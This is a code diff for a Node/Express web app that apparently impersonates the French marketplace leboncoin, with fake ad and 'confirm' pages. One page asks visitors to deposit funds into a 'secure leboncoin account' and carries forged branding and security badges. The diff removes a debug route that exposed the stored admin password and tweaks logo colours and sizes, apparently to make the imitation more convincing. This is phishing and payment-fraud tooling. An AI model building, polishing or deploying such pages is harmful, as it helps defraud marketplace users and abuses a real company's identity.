@@ -32,13 +32,6 @@ function requireAuth(req, res, next) {
   res.redirect('/');
 }
 
-
-// ===== DEBUG (temporaire) =====
-app.get('/debug-auth', async (req, res) => {
-  const pass = await getAdminPass();
-  res.json({ storedPass: pass, env: process.env.NODE_ENV || 'none' });
-});
-
 // ===== LOGIN =====
 app.get('/', (req, res) => {
   if (req.session.loggedIn) return res.redirect('/dashboard');
@@ -350,7 +343,7 @@ app.get('/annonce/:id', async (req, res) => {
     body { background: white; }
     .site-header { background: white; padding: 16px 0 12px; border-bottom: 1px solid #f0f0f0; text-align: center; }
     .site-header img { max-width: 180px; height: auto; }
-    .site-header .logo-text { font-size: 28px; font-weight: 900; color: #f56b2a; letter-spacing: -1px; }
+    .site-header .logo-text { font-size: 28px; font-weight: 900; color: #FF8C00; letter-spacing: -1px; }
     .breadcrumb { font-size: 13px; color: #999; margin-bottom: 18px; padding-bottom: 14px; border-bottom: 1px solid #f5f5f5; }
     .breadcrumb a { color: #4183D7; text-decoration: none; }
     .photos-section { margin-bottom: 22px; position: relative; }
@@ -957,7 +950,7 @@ app.get('/confirmer/:id', async (req, res) => {
   <div class="progress-bar"><div class="progress-fill" style="width:100%"></div></div>
 
   <main class="main">
-    <img src="/images/logo.png" alt="leboncoin" style="height:32px;margin-bottom:20px" onerror="this.style.display='none'">
+    <img src="/images/logo.png" alt="leboncoin" style="height:36px;margin-bottom:20px" onerror="this.style.display='none'">
 
     <h1>Déposez vos fonds sur votre compte sécurisé leboncoin</h1>
 
@@ -1033,7 +1026,7 @@ function sharedStyle() {
   return `*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
   body{background:#fff;color:#111827;font-size:14px}
   .header{background:#fff;border-bottom:3px solid #f56b2a;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 2px 4px rgba(0,0,0,.05)}
-  .logo{font-size:20px;font-weight:900;color:#f56b2a;letter-spacing:-.5px}
+  .logo{font-size:20px;font-weight:900;color:#FF8C00;letter-spacing:-.5px}
   .secure-badge{display:flex;align-items:center;gap:6px;font-size:13px;color:#4b5563}
   .icon-btn{background:none;border:none;cursor:pointer;padding:8px;color:#374151;border-radius:8px}
   .icon-btn:hover{background:#f3f4f6}
@@ -1069,7 +1062,7 @@ function sharedHeader(backUrl = '') {
     <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M5 12L12 19M5 12L12 5" stroke-linecap="round" stroke-linejoin="round"/></svg>
   </button>
   <div style="display:flex;align-items:center;gap:10px">
-    <img src="/images/logo.png" alt="leboncoin" style="height:28px;width:auto" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
+    <img src="/images/logo.png" alt="leboncoin" style="height:36px;width:auto" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
     <span style="display:none;color:#FF8C00;font-weight:900;font-size:20px;letter-spacing:-.5px">leboncoin</span>
     <span style="color:#4b5563;font-size:13px;display:flex;align-items:center;gap:4px">|
       <svg width="13" height="13" viewBox="0 0 16 16" fill="none"><path d="M8 0L2 3V7C2 11 5 14 8 16C11 14 14 11 14 7V3L8 0Z" fill="#4A90E2"/></svg>
